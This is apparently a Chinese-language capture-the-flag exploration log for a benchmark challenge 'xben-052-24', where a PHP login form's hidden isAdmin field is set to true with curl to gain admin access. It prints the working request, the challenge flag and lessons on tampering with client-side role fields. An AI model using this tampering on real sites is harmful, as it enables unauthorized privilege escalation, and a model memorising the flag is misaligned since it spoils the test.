# xben-052-24 · 探索记录

对应题解：[`xben-052-24.md`](./xben-052-24.md)

## 目标与起点

`Apache/2.4.25` + `X-Powered-By: PHP/5.6.40`，标题 `AUTH 01`。

登录表单（`POST index.php`）里有一个隐藏字段：

```html
<input type="hidden" name="isAdmin" value="false" />
```

## 第一阶段：对照组

```bash
curl -d 'username=test&password=test' http://$T/index.php
```

```text
Welcome to Springfield!
```

没有 flag。

## 第二阶段：改隐藏字段

```bash
curl -d 'username=admin&password=admin&isAdmin=true' http://$T/index.php
```

```text
Welcome …
flag{2d954360-2f66-47be-87c3-fb45668bfc88}
```

提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 不带 `isAdmin` | 普通欢迎页 | 没有 flag 分支 |
| 改 `username`/`password` | 无影响 | 口令不参与这个分支 |

## 这次真正的收获

1. **`type="hidden"` 等于把开关写在客户端。** 直接 POST 即可，不需要任何绕过技巧。
2. **先做对照组再改字段。** 两次请求就能确认「flag 由 `isAdmin` 触发」。
3. **同族三种写法都要试**：`hidden`（本题）、`disabled`（005）、
   表单字段被禁用但服务端仍接收（021）。看到「角色/状态」字样就先把值改掉。
